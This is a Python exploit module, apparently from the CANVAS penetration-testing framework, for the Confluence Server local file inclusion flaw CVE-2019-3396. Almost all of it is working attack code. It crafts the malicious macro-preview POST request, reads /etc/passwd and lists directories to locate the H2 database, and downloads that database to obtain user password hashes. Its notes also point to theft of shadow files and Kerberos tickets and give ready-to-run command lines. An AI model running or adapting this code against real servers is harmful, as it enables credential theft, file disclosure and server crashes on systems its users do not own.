#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  confluence_macro_lfi
## Description:
##            :
## Created_On :  Fri Oct 11 2019
## Created_By :  X.
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
###############################################################################

import os
import re
import sys
import copy
import socket
import logging

if '.' not in sys.path:
    sys.path.append('.')

import exploitutils
import shutil

from libs.canvasos import *
from exploitutils import standard_callback_commandline
from canvasexploit import canvasexploit
import canvasengine
import libs.spkproxy as spkproxy
import timeoutsocket

from HTMLParser import HTMLParser
html_parser = HTMLParser()

NAME                            = 'Confluence Server and Data Center - LFI (CVE-2019-3396)'
DESCRIPTION                     = 'Confluence Server may allow an attacker to force the inclusion of files thereby disclosing their content'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Atlassian'
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION['CVE Name']       = 'CVE-2019-3396'
DOCUMENTATION['CVE Url']        = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-3396'
VERSION                         = '1.0'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]

CHANGELOG = """
"""

DOCUMENTATION['NOTES'] = """


A] Default behavior
===================

By default, this module attempts to automatically locate and then fetch
the confluence database. This is all possible thanks to the fact that
the LFI primitive will turn into a directory listing whenever a directory
is specified instead of a file.

To perform the attack on the CLI one may type from $CANVAS_ROOT: (takes some time)
python2 exploits/remote/universal/confluence_macro_lfi/confluence_macro_lfi.py -t 10.161.0.241 -p 8090 -Ovhost:'10.161.0.241'

There are however a couple of limitations:

1. The search algorithm is rather naive and will not be able to handle
   installation with too specific installation paths.

2. A huge problem with Confluence is the way Java handles the memory when
   the LFI primitive is used. Because of this, whenever the file included
   with the LFI primitive is too big (couple of megabytes), the server process
   may actually crash being unable to allocate enough. This is in particular
   true with the confluence database which is more than 20 megabytes initially.

   Note: Linux seems much less stable than Windows in that regard.

3. There is a limitation to how much the server can send. Our tests though
   show that most of the time, while truncated, the partial DB will include
   user information (such as potentially user hashes which may later be cracked).


B] Targeting arbitrary files
============================

First of all it should be noticed that both absolute paths can be used
by the attacker on directories (directory listing) or files (file inclusion)
thus depending on the configuration of the confluence service, several things
could be attempted:

- Kerberos tickets retrieval
- Shadow leak (if confluence is running as root)
- Any sensitive credentials in general without ACL protection

This may or may not lead to RCE.


1. Linux examples
-----------------

# Chosen absolute path:
python2 exploits/remote/universal/confluence_macro_lfi/confluence_macro_lfi.py -t 10.161.0.239 -p 8090'


2. Windows examples
-------------------

# Chosen relative path:
python2 exploits/remote/universal/confluence_macro_lfi/confluence_macro_lfi.py -t 10.161.0.241 -p 8090 -Oremote_file:../web.xml

#Chosen absolute path:
python2 exploits/remote/universal/confluence_macro_lfi/confluence_macro_lfi.py -t 10.161.0.241 -p 8090 -Oremote_file:'C:\windows\win.ini'

Tested against:
    - Confluence 6.6.11 (Ubuntu)
    - Confluence 6.10.1 (Windows 2008 R2)

"""

###########VULN_PATTERN = 'HOST_IS_VULN\r\n'

# Globals
DATA_PREFIX  = '\n               '
DATA_SUFFIX1 = '\n\n            '
DATA_SUFFIX2 = '\n            '
YOUTUBE_URL  = 'https://www.youtube.com/watch?v=XFNoMHGZ1do'
BIG_TIMEOUT  = 300


class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)

        self.name           = NAME
        self.port           = 80
        self.ssl            = False
        self.vhost          = ""
        self.discover       = False
        self.path           = '/'
        self.debug          = False
        self.remote_file    = None

        # Globals
        self.tmppath        = None
        self.respath        = os.path.abspath(os.path.join(os.path.dirname(__file__), "Resources/"))

    def getArgs(self):
        """
        Get arguments for attack
        """
        self.host            = self.target.interface
        self.port            = int(self.argsDict.get("port", self.port))
        self.vhost           = self.argsDict.get("vhost", str(self.host))
        self.ssl             = self.argsDict.get("ssl", self.ssl)
        self.confluence_path = self.argsDict.get("path", self.path)
        self.debug           = self.argsDict.get("debug", self.debug)
        self.remote_file     = self.argsDict.get("remote_file", self.remote_file)

        if self.path != '/':
            if self.path[-1] != '/':
                 self.path = self.path + '/'

        if not self.vhost:
            self.vhost = str(self.host)

        return

    def is_alive(self):
        """
        Detects if the connection can be established or not.
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.host,self.port))
            s.close()
            return True
        except Exception as e:
            return False


    ###
    # Web requests related API
    ###

    def is_directory(self, path):
        """
        Returns True if the path is a directory else return False.
        This assumes that the underlying crawler does its job.
        """
        if path[-1:] == '/':
            return True
        return False

    def get_url(self, vhost, path):
        """
        Creates an URL based on the vhost and the path (URI).
        Note: URI based on https://github.com/jas502n/CVE-2019-3396.
        """
        url = "https" if self.ssl else "http"
        url += "://%s:%s" % (vhost, self.port)
        url += path
        url += '/rest/tinymce/1/macro/preview'
        return url

    def send_http_request(self, current_vhost, uri, method, data=''):
        """
        Generic wrapper around urlopen().
        """

        exheaders = [("Content-Type", "application/json; charset=utf-8"),]

        url = self.get_url(current_vhost, uri)
        logging.debug('%s %s' % (method, url))
        (payload, http_code) = spkproxy.urlopen(url,
                                                extraheaders=exheaders,
                                                exploit=None,
                                                entireresponse=True,
                                                return_response_code=True,
                                                auth=None,
                                                data=data,
                                                verb=method)
        return (http_code, payload)

    def get_request(self, current_vhost, uri):
        """
        Performs a GET request.
        """
        return self.send_http_request(current_vhost, uri, 'GET')

    def post_request(self, current_vhost, uri, payload):
        """
        Performs a PUT request.
        """
        return self.send_http_request(current_vhost, uri, 'POST', data=payload)

    def __attack_uri(self, vhost, uri, template=None, command=None):
        """
        Create and send the POST request for a given vhost, URI and payload.
        This is a template function and is meant to be wrapped.
        """

        params = { 'url': YOUTUBE_URL, 'width': '1000', 'height': '1000' }

        if template:
            params['_template'] = template

        if command:
            params[command['name']] = command['value']

        params_str = ', '.join(map(lambda x: "\"%s\":\"%s\"" % (x,params[x]), params.keys()))
        post_data = '{"contentId":"1","macro":{"name":"widget","params":{%s},"body":""}}' % params_str

        logging.debug('POST data string built: %s' % post_data)
        try:

            http_code, payload = self.post_request(vhost, uri, post_data)
            if http_code != 200:
                logging.error("POST request failed [HTTP ERROR: %s]" %  http_code)
                return -2, None

            return 0, payload.read()

        except Exception as e:
            logging.error('Unhandled error while sending the POST request: %s' % str(e))
            return -1, None

    def perform_lfi(self, vhost, uri, fname, absolute_path=True):
        """
        Perform the LFI attack for a given vhost, URI and file.
        Note: This function won't return for now the exact file (there may be an additional prefix/suffix)
        """

        if absolute_path:
            fname_str = 'file://%s' % fname
        else:
            fname_str = '%s' % fname

        ret, body = self.__attack_uri(vhost, uri, fname_str)
        if ret:
            logging.error('Failed to retrieve %s' % fname)
            return ret, None

        try:
            wrapped_content = body.split('<div class="wiki-content">')[1].split('\n            </div>\n        </div>\n    </div>')[0]

            # At this point, the content is 'normally' wrapped between DATA_PREFIX
            # and either DATA_SUFFIX1 or DATA_SUFFIX2.
            # We remove as much as possible these tags.

            begin_offset = 0
            if wrapped_content.find(DATA_PREFIX) == 0:
                begin_offset = len(DATA_PREFIX)

            end_offset = len(wrapped_content[begin_offset:])

            return 0, wrapped_content[begin_offset:][:end_offset]

        except Exception as e:
            logging.error('An error occured while fetching the file: %s' % str(e))
            return -1, None

    def dir_listing(self, vhost, uri, fname, absolute_path=True):
        """
        Performs a directory listing using the LFI primitive.
        """

        if absolute_path:
            fname_str = 'file://%s' % fname
        else:
            fname_str = '%s' % fname

        if fname_str[-1] != '/':
            fname_str += '/'

        try:
            ret, body = self.__attack_uri(vhost, uri, fname_str)

            wrapped_content = body.split('<div class="wiki-content">')[1].split('\n            </div>\n        </div>\n    </div>')[0]

            # At this point, the content is 'normally' wrapped between DATA_PREFIX
            # and either DATA_SUFFIX1 or DATA_SUFFIX2.
            # We remove as much as possible these tags.

            begin_offset = 0
            if wrapped_content.find(DATA_PREFIX) == 0:
                begin_offset = len(DATA_PREFIX)

            end_offset = len(wrapped_content[begin_offset:])

            dir_list = wrapped_content[begin_offset:][:end_offset].split('\n')
            if '' in dir_list:
                dir_list.remove('')

            return 0, dir_list
        except Exception as e:
            logging.error('An error occured while fetching the dir list: %s' % str(e))
            return -1, None

    def target_is_linux(self, vhost, uri):
        """
        Returns True iff the target is Linux.
        """
        ret, content = self.perform_lfi(vhost, uri, '/etc/passwd', absolute_path=True)
        if ret or 'root' not in content:
            return False
        else:
            return True

    def target_is_windows(self, vhost, uri):
        """
        Returns True iff the target is Windows.
        """
        ret, content = self.perform_lfi(vhost, uri, '/C:/Windows', absolute_path=True)
        if ret or 'System32' not in content:
            return False
        else:
            return True

    def download_h2db(self, vhost, uri, fname, absolute_path=True):
        """
        Downloads the H2 database and saves it within a file.
        Notes:
            - This may not work on Linux as the DB is big and the backend
              on Linux sometimes failes to satisfy the request.
            - The DB will most likely be truncated but it should still be
              possible to extract the hashes of the users to login.
        """

        ret, content = self.perform_lfi(vhost, uri, fname, absolute_path=absolute_path)
        logging.info('Attempting to download the DB, this may take a while')
        if ret:
            logging.error('Failed to fetch %s' % fname)
            return ret, content

        begin_offset = content.find('-- H2')
        if begin_offset == -1:
            begin_offset = 0

        try:
            fname = os.path.join(self.tmppath, 'h2_confluence.db')
            f = open(fname, 'w+')
            f.write(content[begin_offset:])
            f.close()
            logging.info('Server response saved in %s' % fname)
            return ret, content[begin_offset:]

        except Exception as e:
            logging.error('An error occured while fetching the file: %s' % str(e))
            return -1, None

    def __get_unix_confluence_database(self, vhost, uri):
        """
        Linux/UNIX backend for get_confluence_database()
        """

        logging.info('Attempting to locate the root installation path')
        ret, passwd_file = self.perform_lfi(self.vhost, uri, fname='/etc/passwd', absolute_path=True)
        if ret:
            logging.error('Could not fetch /etc/passwd to prepare the dictory listing stage')
            return -2

        L = passwd_file.split('\n')
        candidates = []
        for line in L:
            if len(line.split(':')) != 7:
                continue
            username, uid, homedir = line.split(':')[0], int(line.split(':')[2]), line.split(':')[5]
            if uid < 1000:
                continue

            candidates.append((username, uid, homedir))

        for username, uid, homedir in candidates:

            fullpath = '%s/atlassian/application-data/confluence/database/h2db.h2.db' % homedir
            logging.info('Found a potential candidate: %s' % fullpath)
            ret, content = self.download_h2db(self.vhost, uri, fname=fullpath, absolute_path=True)
            if ret:
                logging.info('Wrong path! Skipping.')
                continue

            # If the path is incorrect.
            if '<div class="widget-error">' in content:
                logging.info('Target file does not exist! Wrong path, skipping.')
                continue

            # Sometimes the remote process is just unable to handle the request because Java does not
            # handle its memory very well. In that case there might be a crash and we will see it.
            if len(content) < (1024 * 1024) and 'Java heap space' in content:
                logging.info('Remote java process crashed due to memory exhaustion!')
                return -3

            return 0

        logging.error('Could not find the Confluence Database')
        return -1

    def __get_windows_confluence_database(self, vhost, uri):
        """
        Windows backend for get_confluence_database()
        """

        logging.info('Attempting to locate the root installation path')
        ret, dir_listing = self.dir_listing(self.vhost, uri, fname='/C:/Program Files/Atlassian/Application Data/', absolute_path=True)
        if ret:
            logging.error('Directory listing of C:/Program Files/Atlassian/Application Data/ failed!')
            return -2

        for candidate in dir_listing:
            if not 'confluence' in candidate.lower():
                continue

            fullpath = '/C:/Program Files/Atlassian/Application Data/%s/database/h2db.h2.db' % candidate
            logging.info('Found a potential subdirectory %s' % fullpath[1:])
            ret, content = self.download_h2db(self.vhost, uri, fname=fullpath, absolute_path=True)
            if not ret:
                # Sometimes the remote process is just unable to handle the request because Java does not
                # handle its memory very well. In that case there might be a crash and we will see it.
                if len(content) < (1024 * 1024) and 'Java heap space' in content:
                    logging.info('We are out of luck, the remote java process crashed due to memory exhaustion!')
                    return -3

                return 0

        logging.error('Could not find the Confluence Database')
        return -1

    def get_confluence_database(self, vhost, uri):
        """
        Depending on whether the target is linux or windows, we use
        one or the other underlying method.
        """

        if self.target_is_linux(vhost, uri):
            return self.__get_unix_confluence_database(vhost, uri)

        if self.target_is_windows(vhost, uri):
            return self.__get_windows_confluence_database(vhost, uri)

        logging.error('Target is neither Linux nor Windows')
        return -1

    def pwn_it(self, alternate_fname=None):
        """
        Attempts to exploit the LFI.
        """

        ret = 0
        vhost = self.vhost
        uri = self.path

        self.setInfo("Running %s against %s [vhost:%s]" % (NAME, self.host, self.vhost))

        # First of all we need to change the default socket timeout
        # as Immunity's spike is _very_ slow. The original value will be
        # restored before ending the function.
        old_timeout = timeoutsocket.getDefaultSocketTimeout()
        timeoutsocket.setDefaultSocketTimeout(BIG_TIMEOUT)

        if alternate_fname:
            logging.info('Attempting to fetch %s' % alternate_fname)
            if alternate_fname.startswith("../"):
                logging.warning('Relative path detected, only working against Windows!')
                ret, content = self.perform_lfi(vhost, uri, alternate_fname, absolute_path=False)
            else:
                # To allow users to use Windows path we need a few modifications.
                if alternate_fname[1:3] == ':\\':
                    logging.warning('Detected a Windows path, normalizing it.')
                    alternate_fname = '/' + alternate_fname.replace('\\', '/')
                    logging.info('New path is now: %s' % alternate_fname)
                ret, content = self.perform_lfi(vhost, uri, alternate_fname, absolute_path=True)
            if not ret:
                logging.info('Server returned:')
                logging.info('\n'+content)
                timeoutsocket.setDefaultSocketTimeout(old_timeout)
                return 1
        else:
            ret = self.get_confluence_database(self.vhost, uri)
            timeoutsocket.setDefaultSocketTimeout(old_timeout)
            if not ret:
                return 1
            else:
                return 0

    def test(self):
        """
        Simple test function.
        """

        # We may need more debugging
        if self.debug:
            logger = logging.getLogger()
            logger.setLevel(logging.DEBUG)

        # Is the remote target even alive?
        if not self.is_alive():
            logging.error('The connection can not be established.')
            logging.error("%s - found no reachable host!" % self.name)
            self.setInfo("%s - found no reachable host!" % self.name)
            return 0

        # Throws a warning if it is likely that the user should have checked the SSL box
        if not self.ssl and self.port in [443, 8443]:
            logging.warning('You are running the exploit against port %d yet SSL/TLS is disabled' % self.port)
        if self.ssl and self.port in [80, 8080]:
            logging.warning('You are running the exploit against port %d yet SSL/TLS is enabled' % self.port)

        return 1

    def run(self):
        """
        Runs the attempt to exploit the LFI.
        """

        self.getArgs()
        self.tmppath = self.engine.create_new_session_output_dir(str(self.host), 'temp_files')
        uri = self.path

        ret = self.test()
        if not ret:
            logging.error("%s - Exploit failed!" % self.name)
            self.setInfo("%s - Exploit failed!" % self.name)
            return 0

        ret = self.pwn_it(self.remote_file)
        if ret:
            logging.info("%s for %s - done (success)" % (NAME, self.vhost))
            self.setInfo("%s for %s - done (success)" % (NAME, self.vhost))
            return 1
        else:
            logging.error("%s - Exploit failed!" % self.name)
            self.setInfo("%s - Exploit failed!" % self.name)
            return 0

if __name__ == '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
